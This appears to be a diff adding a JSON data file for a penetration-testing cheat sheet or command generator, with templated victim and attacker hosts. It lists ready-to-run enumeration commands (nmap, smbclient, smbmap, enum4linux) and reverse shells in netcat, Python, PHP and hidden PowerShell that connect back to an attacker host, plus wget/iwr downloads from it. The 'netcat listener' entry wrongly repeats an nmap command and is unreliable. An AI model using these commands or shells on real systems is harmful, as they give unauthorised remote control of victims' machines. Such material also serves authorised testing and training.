@@ -1,0 +1,116 @@
+{
+    "enum": [
+        {
+            "title": "nmap",
+            "commands": [
+                {
+                    "code": "ports=$(nmap -p- --min-rate=1000 -T4 ${victimHost} | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)",
+                    "info": "scan victim ports"
+                },
+                {
+                    "code": "nmap -sC -sV -p$ports ${victimHost}",
+                    "info": "scan victim ports 2"
+                }
+            ]
+        },
+        {
+            "title": "smb",
+            "commands": [
+                {
+                    "code": "smbclient -L //${victimHost} -N",
+                    "info": "unauthenticated enumeration of SMB shares"
+                },
+                {
+                    "code": "smbmap -H ${victimHost}",
+                    "info": "enumeration of smb"
+                }
+            ]
+        },
+        {
+            "title": "enum4linux",
+            "commands": [
+                {
+                    "code": "enum4linux ${victimHost}"
+                }
+            ]
+        }
+    ],
+    "shells": [
+        {
+            "title": "netcat",
+            "commands": [
+                {
+                    "code": "nc ${attackerHost} ${attackerPort} –e /bin/bash"
+                }
+            ]
+        },
+        {
+            "title": "python",
+            "commands": [
+                {
+                    "code": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${attackerHost}\",${attackerPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
+                    "info": "python reverse shell"
+                }
+            ]
+        },
+        {
+            "title": "php",
+            "commands": [
+                {
+                    "code": "php -r '$sock=fsockopen(\"${attackerHost}\",${attackerPort});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                    "info": "php reverse shell"
+                }
+            ]
+        },
+        {
+            "title": "powershell",
+            "commands": [
+                {
+                    "code": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${attackerHost}\",${attackerPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+                    "info": "powershell reverse shell"
+                }
+            ]
+        }
+    ],
+    "http": [
+        {
+            "title": "wget",
+            "commands": [
+                {
+                    "code": "wget http://${attackerHost}:${attackerPort}/${filename}",
+                    "info": "wget a file"
+                }
+            ]
+        },
+        {
+            "title": "powershell",
+            "commands": [
+                {
+                    "code": "iwr http://${attackerHost}:${attackerPort}/${filename} -outfile .\\${filename}",
+                    "info": "wget a file"
+                }
+            ]
+        }
+    ],
+    "misc": [
+        {
+            "title": "tty shells",
+            "subtitle": "python",
+            "commands": [
+                {
+                    "code": "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+                    "info": "spawn a tty shell"
+                }
+            ]
+        },
+        {
+            "title": "netcat listener",
+            "commands": [
+                {
+                    "code": "nmap -sC -sV -p$ports ${victimHost}"
+                }
+            ]
+        }
+    ],
+    "links": []
+}
